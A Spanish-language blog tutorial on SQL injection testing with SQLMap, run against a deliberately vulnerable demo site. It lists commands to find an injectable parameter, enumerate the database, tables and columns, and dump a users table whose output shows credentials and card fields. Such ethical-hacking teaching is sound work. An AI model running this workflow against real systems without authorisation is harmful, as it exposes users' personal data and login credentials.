---
title: 'Seguridad en bases de datos con SQLMap'
description: 'Comprobando la seguridad de un sistema web con SQLMap'
date: 'Octubre 15, 2021'
image: '/images/posts/seguridad-en-bases-de-datos-con-sqlmap.jpg'
author:
  name: 'Óscar Miranda'
  image: '/images/author.png'
tags: ['Tutorial']
---

Prácticamente todas las aplicaciones web necesitan un modo de almacenar datos
con los que los usuarios interactúan, la solución más común es utilizar bases de
datos. Existen distintos tipos de bases de datos y uno de ellos son las BB.DD.
relacionales.

Las bases de datos relacionales pueden ser leídas o modificadas con un lenguaje
llamado SQL. Así es como muchos de los sitios web manejan su información, sin
embargo, existen algunos que no toman las suficientes medidas de seguridad y
hacen que este código SQL pueda ser fácilmente modificado por el usuario
mediante inyecciones SQL.

### ¿Qué es una inyección SQL?

Una inyección SQL consiste en aprovecharse de ciertos aspectos de la aplicación
para modificar intencionalmente el código SQL y así modificar su comportamiento.
El impacto que puede tener esto puede ser conseguir acceso no autorizado a una
página o bien conseguir toda la información de la base de datos.

Para facilitar las inyecciones SQL se puede utilizar una herramienta llamada
[SQLMap](https://sqlmap.org/) y es la que se explicará en este post.

> Este artículo no tiene como objetivo enseñar a utilizar la herramienta con
> fines maliciosos, solamente busca dar a conocer un nuevo método para comprobar
> la seguridad de un sistema propio o con fines éticos.

### ¿Cómo utilizar SQLMap?

Existen varios sitios que voluntariamente dejan vulnerabilidades para que
podamos probar nuevas herramientas y aprender sobre el hacking ético, por lo que
en este artículo se utilizará <http://testphp.vulnweb.com/listproducts.php?cat=1>,
que indica que ha dejado vulnerabilidades a propósito con fines educativos.

SQLMap puede ser utilizado en cualquier sistema operativo (requiere
[Python](https://www.python.org/)).

#### 1. Comprobar si el sitio es vulnerable

Si observamos la URL de la página podemos notar que se recibe información de
esta (hay datos después de `?`). Podemos comprobar si el argumento cat es
vulnerable con el comando:

```shell
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1
```

Al ejecutar este comando, SQLMap notará que hay un parámetro vulnerable `cat`,
por lo que intentará aprovecharlo. En algunos pasos SQLMap preguntará si se debe
omitir algunas pruebas, en este caso (dado que ya sabemos que el sitio web es
vulnerable) podemos responder que sí.

Al terminar de ejecutarse SQLMap enlistará las formas en las que se puede atacar
el sitio web.

#### 2. Verificar la bases de datos actual

Si queremos obtener más información de la base de datos actual necesitamos su
nombre, esto puede hacerse de la siguiente manera:

```shell
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --current-db
```

Este comando nos mostrará el nombre de la base de datos actual (acuart) y
podremos usarlo para obtener más datos.

#### 3. Enlistar las tablas

Se pueden enlistar las tablas existentes con el siguiente comando (_nota que se
está indicando la base de datos actual_):

```shell
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
```

El comando anterior mostrará el siguiente resultado:

```plaintext
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+
```

#### 4. Enlistar columnas de una tabla

Habiendo obtenido la lista de las tablas es posible guardar todo el contenido de
estas sin restricción alguna. De hecho, hay una tabla que parece ser la más
interesante de momento, la tabla `users`, pues podría contener información de
acceso (o simplemente datos personales). Esto se puede comprobar viendo los
nombres de las columnas sin tener que pedir la información todavía:

```shell
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users
--columns
```

_Observa cómo se indica el nombre de la tabla y se pide las columnas._

SQLMap devuelve el siguiente resultado:

```plaintext
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| name    | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+
```

Como se puede notar, si esta base de datos hubiera contenido datos reales habría
sido un gran problema, pues habrían sido expuestos los datos personales de los
usuarios como la dirección donde viven, sus correos electrónicos y sus números
de teléfono, dichos datos son muy valiosos para los cibercriminales (recureda
que esa no es la intención de este artículo). Además, podemos observar los
campos `uname` y `pass` que posiblemente sean los que permiten iniciar sesión.

#### 5. Listar contenido de una tabla

Vamos a verificar qué hay en la tabla anterior con el siguiente comando:

```shell
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users
--dump
```

El contenido de la tabla se muestra en pantalla y opcionalmente SQLMap permite
intentar decifrar las contraseñas incluidas (respondemos que no por el momento).

<!-- markdownlint-disable MD013 -->
```plaintext
Database: acuart
Table: users
[1 entry]
+---------+----------------------------------+------+------+----------------+-----------+-------+---------+
| cc      | cart                             | name | pass | email          | phone     | uname | address |
+---------+----------------------------------+------+------+----------------+-----------+-------+---------+
| 1234567 | 336c4f03021a2a1a046f89ffa765971d | 1}   | test | arru@gmail.com | 081234565 | test  | bekasi  |
+---------+----------------------------------+------+------+----------------+-----------+-------+---------+
```
<!-- markdownlint-enable MD013 -->

Podemos ver que los datos de acceso son visibles (uname=test, pass=test), por lo
que fácilmente podríamos iniciar sesión. También hay un campo llamado cart que
parece estar encriptado, ese se puede averiguar utilizando otras herramientas.
